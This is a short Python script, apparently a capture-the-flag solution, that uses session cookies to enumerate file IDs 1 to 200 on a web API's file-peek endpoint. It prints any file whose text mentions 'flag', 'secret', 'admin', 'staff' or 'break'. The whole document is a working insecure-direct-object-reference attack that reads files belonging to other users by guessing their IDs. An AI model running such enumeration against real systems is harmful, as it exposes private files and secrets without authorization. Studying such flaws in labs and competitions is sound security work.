# fill in the relevant fields for the cookies dict before running

import requests
import sys

cookies={'zid': '', 'token': ''}

for i in range(1, 201):
    r = requests.get(r'http://drive.bing.ns.agency/api/peek/file?file_id=' + str(i), cookies=cookies)
    contents = r.text.lower().rstrip()
    if 'flag' in contents or 'break' in contents or 'staff' in contents or 'secret' in contents or 'admin' in contents:
        print(r.text.rstrip() + ',')
